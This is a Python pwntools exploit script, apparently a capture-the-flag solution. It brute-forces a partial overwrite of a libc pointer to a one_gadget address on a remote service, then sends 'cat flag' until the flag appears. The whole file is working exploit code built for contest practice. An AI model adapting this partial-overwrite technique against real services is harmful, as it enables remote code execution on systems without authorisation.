import sh
import sys
import pwn #pylint:disable=import-error
import tqdm
#import multiprocessing

def one_interaction(r, mask):
	r.send(pwn.p64(-0x40&0xffffffffffffffff))
	r.send(chr(mask))
	r.send('\0'*8)
	return mask, r.readuntil('Go')

def connect(host, port):
	r = pwn.remote(host, port)
	r.readuntil("Go\n")
	return r

def fire(r, mask):
	r.send(pwn.p64(-0x40&0xffffffffffffffff) + '\x00'*256)
	r.recv(0)
	r.send(mask)
	r.recv(0)
	if 'Go' in r.readuntil('Go', timeout=3):
		return ''
	r.sendline('cat flag')
	r.recv(0)
	r.sendline('cat flag')
	r.recv(0)
	r.sendline('cat flag')
	return r.readuntil('Go')

#def run_interaction_mp(args): return run_interaction(*args)
#def make_report_mp(host, port):
#	p = multiprocessing.Pool()
#	mr = p.map_async(run_interaction_mp, [ (host, port, m) for m in range(256) ])
#	mr.wait()
#	return dict(mr.get())

def get_offset(libc):
	read_addr = int(next(s for s in str(sh.nm('-D', libc)).split('\n') if s.endswith(' read')).split()[0], 16)
	magic_addrs = map(int, str(sh.Command('/home/yans/.gem/ruby/2.5.0/bin/one_gadget')('-r', libc)).split())

	read_bytes = pwn.p32(read_addr)
	magic_bytes = map(pwn.p32, magic_addrs)

	# find one that only differs in the first two bytes
	for m in magic_bytes:
		if m[2:] == read_bytes[2:]:
			print "Going with", m.encode('hex'), read_bytes.encode('hex')
			return m[:2]
	raise Exception('dang')

def make_report(host, port):
	d = { }
	r = connect(host, port)
	for i in tqdm.tqdm(range(256)):
		d[i] = one_interaction(r, i)[1]
	return d

def exploit(host, port, libc):
	r = connect(host, int(port))
	o = get_offset(libc)
	while True:
		print "."
		s = fire(r, o)
		print s
		if 'OOO' in s:
			break

if __name__ == '__main__':
	#print make_report(sys.argv[1], int(sys.argv[2]))
	host = sys.argv[1]
	port = sys.argv[2]
	try:
		libc = sys.argv[3]
	except IndexError:
		libc = 'libs/libc6-amd64_2.23-0ubuntu3_i386.so'
	exploit(host, port, libc)
